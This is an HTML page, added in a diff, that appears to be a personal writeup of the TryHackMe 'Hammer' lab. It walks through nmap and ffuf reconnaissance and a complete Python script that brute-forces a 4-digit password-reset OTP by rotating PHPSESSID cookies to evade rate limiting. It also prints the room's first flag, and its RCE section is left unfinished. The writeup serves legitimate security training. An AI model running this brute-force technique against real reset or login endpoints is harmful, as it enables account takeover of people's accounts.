@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hammer — TryHackMe Writeup | afiqers</title>
+  <meta name="description"
+    content="TryHackMe Hammer room writeup by Muhammad Afiq. Bypass authentication via PHPSESSID rotation and OTP brute force, then achieve RCE.">
+  <meta name="author" content="Muhammad Afiq Bin Mohd Nizam">
+  <link rel="stylesheet" href="../../style.css">
+  <link rel="stylesheet" href="../../writeup.css">
+  <link rel="icon"
+    href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚩</text></svg>">
+</head>
+
+<body>
+
+  <canvas id="particles-canvas"></canvas>
+
+  <!-- Navbar -->
+  <nav class="navbar scrolled" id="navbar">
+    <a href="../../index.html" class="nav-logo">afiq<span>@portfolio</span>:~$</a>
+    <div class="nav-links" id="navLinks">
+      <a href="../../index.html">Home</a>
+      <a href="index.html">TryHackMe Rooms</a>
+      <a href="#tasks">Tasks</a>
+    </div>
+    <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle menu">
+      <span></span><span></span><span></span>
+    </button>
+  </nav>
+
+  <!-- ==================== WRITEUP HERO ==================== -->
+  <section class="writeup-hero">
+    <div class="writeup-hero-content">
+      <a href="index.html" class="back-link">← Back to TryHackMe Rooms</a>
+      <div class="ctf-badge">🏠 TRYHACKME WRITEUP</div>
+      <h1 class="writeup-title">Hammer</h1>
+      <p class="writeup-tagline">"With the Hammer in hand, can you bypass the authentication mechanisms and get RCE on the system?"</p>
+
+      <div class="ctf-stats">
+        <div class="ctf-stat">
+          <span class="ctf-stat-value">Medium</span>
+          <span class="ctf-stat-label">Difficulty</span>
+        </div>
+        <div class="ctf-stat">
+          <span class="ctf-stat-value">Web</span>
+          <span class="ctf-stat-label">Category</span>
+        </div>
+        <div class="ctf-stat">
+          <span class="ctf-stat-value">2</span>
+          <span class="ctf-stat-label">Flags</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== WRITEUP CONTENT ==================== -->
+  <section id="tasks" class="challenges-section">
+    <div class="section-header">
+      <p class="section-label">// Walkthrough</p>
+      <h2 class="section-title">Tasks</h2>
+      <p class="section-subtitle">Step-by-step writeup covering recon, auth bypass, and RCE.</p>
+    </div>
+
+    <!-- ===== TASK 1: RECON ===== -->
+    <article class="challenge-block reveal" id="task-recon">
+      <div class="challenge-header">
+        <div class="challenge-meta-row">
+          <span class="writeup-tag tag-recon" style="background:rgba(168,85,247,0.15); color:var(--accent-purple);">Recon</span>
+          <span class="challenge-name">Task 1 — Reconnaissance</span>
+        </div>
+      </div>
+
+      <div class="challenge-body">
+
+        <h3 class="step-heading">🔍 Nmap Scan</h3>
+        <p>Let's start with an Nmap scan. From the results, we can see that there are <strong>2 open ports</strong> — port <code>22</code> for SSH and port <code>1337</code> for an Apache web server.</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <span class="code-file">Terminal</span>
+          </div>
+          <pre><code>nmap -sV -sC -oN scan.txt TARGET_IP</code></pre>
+        </div>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Nmap Scan Results ]</span>
+            <p>Replace with: images/hammer/nmap-scan.png</p>
+          </div>
+        </div>
+
+        <h3 class="step-heading">🌐 Web Enumeration</h3>
+        <p>Going to the webpage on port <code>1337</code> brings us directly to the <strong>login page</strong>.</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Login Page ]</span>
+            <p>Replace with: images/hammer/login-page.png</p>
+          </div>
+        </div>
+
+        <p>Inspecting the page source code reveals an interesting <strong>HTML comment</strong> about a naming convention — all directories follow the format <code>hmr_DIRECTORY_NAME</code>.</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Source Code Comment ]</span>
+            <p>Replace with: images/hammer/source-comment.png</p>
+          </div>
+        </div>
+
+        <h3 class="step-heading">📁 Directory Fuzzing</h3>
+        <p>Using the discovered naming convention, we can fuzz for hidden directories with <strong>ffuf</strong>:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <span class="code-file">ffuf</span>
+          </div>
+          <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+     -u http://TARGET_IP:1337/hmr_FUZZ</code></pre>
+        </div>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ ffuf Results ]</span>
+            <p>Replace with: images/hammer/ffuf-results.png</p>
+          </div>
+        </div>
+
+        <p>We discover the directory <code>hmr_logs</code>. Navigating to it reveals a file named <code>error.logs</code> — and inside, something very useful:</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ error.logs content ]</span>
+            <p>Replace with: images/hammer/error-logs.png</p>
+          </div>
+        </div>
+
+        <ul class="finding-list">
+          <li>Directory naming convention: <code>hmr_DIRECTORY_NAME</code></li>
+          <li>Hidden directory discovered: <strong>hmr_logs</strong></li>
+          <li>Leaked email address found in logs: <strong>tester@hammer.thm</strong></li>
+        </ul>
+
+      </div>
+    </article>
+
+    <!-- ===== TASK 2: AUTH BYPASS ===== -->
+    <article class="challenge-block reveal" id="task-authbypass">
+      <div class="challenge-header">
+        <div class="challenge-meta-row">
+          <span class="writeup-tag tag-web">Web</span>
+          <span class="challenge-name">Task 2 — Bypass the Login</span>
+        </div>
+      </div>
+
+      <div class="challenge-body">
+
+        <h3 class="step-heading">📧 Password Reset</h3>
+        <p>Navigate to <code>/reset_password.php</code> and submit the discovered email <code>tester@hammer.thm</code>. The app responds by asking for a <strong>4-digit recovery code</strong>.</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Reset Password Page ]</span>
+            <p>Replace with: images/hammer/reset-password.png</p>
+          </div>
+        </div>
+
+        <h3 class="step-heading">🧪 Rate Limit Analysis</h3>
+        <p>A naive brute force attempt is blocked by <strong>rate limiting</strong>. Intercepting the request with Burp Suite reveals a <code>Rate-Limit-Pending</code> header in the response. The counter starts at <strong>8</strong> and decreases with each attempt — once it reaches 0, the session is exhausted.</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Burp Suite — Rate-Limit-Pending Header ]</span>
+            <p>Replace with: images/hammer/burp-rate-limit.png</p>
+          </div>
+        </div>
+
+        <p>Trying to reset the page, re-entering the email, or reopening the site all had no effect — because the <strong>PHPSESSID cookie</strong> remained the same. This reveals the key insight: <strong>one PHPSESSID allows exactly 8 attempts</strong> before it's exhausted.</p>
+
+        <h3 class="step-heading">🧠 Bypass Strategy</h3>
+        <p>Sending a request to <code>/reset_password.php</code> with an <strong>empty PHPSESSID</strong> generates a fresh session cookie — each new session resets the rate limit counter. This means we can <strong>rotate PHPSESSID tokens</strong> to brute force all 10,000 possible 4-digit OTP codes.</p>
+
+        <div class="attack-flow">
+          <div class="flow-step">
+            <div class="flow-number">1</div>
+            <div class="flow-text">POST to <code>/reset_password.php</code> with empty cookie → receive fresh PHPSESSID</div>
+          </div>
+          <div class="flow-step">
+            <div class="flow-number">2</div>
+            <div class="flow-text">Use that PHPSESSID to try up to 7 OTP codes (staying under the 8-attempt limit)</div>
+          </div>
+          <div class="flow-step">
+            <div class="flow-number">3</div>
+            <div class="flow-text">Before the limit is hit, rotate to a fresh PHPSESSID and continue</div>
+          </div>
+          <div class="flow-step">
+            <div class="flow-number">4</div>
+            <div class="flow-text">Repeat until the correct OTP is found</div>
+          </div>
+        </div>
+
+        <h3 class="step-heading">🚀 Exploit Script</h3>
+        <p>A Python script to automate the PHPSESSID rotation and OTP brute force:</p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">Python</span>
+            <span class="code-file">exploit.py</span>
+          </div>
+          <pre><code>import requests
+
+TARGET = "http://10.48.167.101:1337"
+EMAIL  = "tester@hammer.thm"
+
+def get_new_session():
+    """Get a fresh PHPSESSID by posting to reset_password.php"""
+    r = requests.post(
+        f"{TARGET}/reset_password.php",
+        data={"email": EMAIL},
+        allow_redirects=False
+    )
+    return r.cookies.get("PHPSESSID")
+
+def try_otp(session_id, otp):
+    """Submit an OTP code using a given PHPSESSID"""
+    r = requests.post(
+        f"{TARGET}/reset_password.php",
+        data={"otp": otp},
+        cookies={"PHPSESSID": session_id}
+    )
+    return r
+
+def brute_force_otp():
+    attempts_per_session = 7  # stay under the 8-try limit
+
+    session_id = get_new_session()
+    attempt_count = 0
+    print(f"[*] Starting with PHPSESSID: {session_id}")
+
+    for otp in range(10000):
+        otp_str = str(otp).zfill(4)
+
+        # Rotate session before hitting the rate limit
+        if attempt_count >= attempts_per_session:
+            session_id = get_new_session()
+            attempt_count = 0
+            print(f"[*] Rotated to new PHPSESSID: {session_id}")
+
+        r = try_otp(session_id, otp_str)
+        attempt_count += 1
+        print(f"[.] Trying OTP {otp_str} -> {r.status_code}")
+
+        if "invalid" not in r.text.lower() and r.status_code == 200:
+            print(f"[+] SUCCESS! OTP: {otp_str}")
+            print(r.text)
+            break
+
+if __name__ == "__main__":
+    brute_force_otp()</code></pre>
+        </div>
+
+        <p>Running the script cycles through all possible OTP codes, rotating sessions to stay under the rate limit — until the correct code is found! 🎉</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Script Output — OTP Found ]</span>
+            <p>Replace with: images/hammer/otp-found.png</p>
+          </div>
+        </div>
+
+        <h3 class="step-heading">🔓 First Flag</h3>
+        <p>After resetting the password and logging in with the new credentials, we land on the dashboard and capture the first flag!</p>
+
+        <div class="screenshot-placeholder reveal">
+          <div class="img-placeholder">
+            <span>[ Dashboard — First Flag ]</span>
+            <p>Replace with: images/hammer/flag1.png</p>
+          </div>
+        </div>
+
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG 1</span>
+          <code class="flag-value">THM{AuthBypass3D}</code>
+        </div>
+
+        <div class="takeaway-box">
+          <h4>💡 Key Takeaways</h4>
+          <ul>
+            <li>Rate limiting tied to <code>PHPSESSID</code> can be bypassed by rotating session tokens</li>
+            <li>Always check response headers — <code>Rate-Limit-Pending</code> revealed the session limit</li>
+            <li>Source code comments can leak critical information like directory naming conventions</li>
+            <li>Log files in hidden directories often contain sensitive data (emails, credentials)</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+
+    <!-- ===== TASK 3: RCE ===== -->
+    <article class="challenge-block reveal" id="task-rce">
+      <div class="challenge-header">
+        <div class="challenge-meta-row">
+          <span class="writeup-tag tag-web">Web</span>
+          <span class="challenge-name">Task 3 — Remote Code Execution</span>
+        </div>
+      </div>
+
+      <div class="challenge-body">
+
+        <h3 class="step-heading">💻 Command Execution</h3>
+        <p>The dashboard provides a command execution interface. Most commands are blocked — however, <code>ls</code> works, confirming there is some form of command filtering in place.</p>
+
+        <!-- Add your RCE content below -->
+        <div class="takeaway-box" style="border-color: rgba(255,215,0,0.3); background: rgba(255,215,0,0.04);">
+          <h4 style="color: var(--accent-yellow);">⚠️ Section In Progress</h4>
+          <ul>
+            <li>Continue the writeup from the RCE section here</li>
+            <li>Document the command filter bypass technique</li>
+            <li>Add the second flag below</li>
+          </ul>
+        </div>
+
+        <!--
+        <div class="flag-box">
+          <span class="flag-label">🚩 FLAG 2</span>
+          <code class="flag-value">THM{...}</code>
+        </div>
+        -->
+
+      </div>
+    </article>
+
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>Built with <span class="heart">❤️</span> by Muhammad Afiq © 2025</p>
+  </footer>
+
+  <script src="../../script.js"></script>
+</body>
+
+</html>
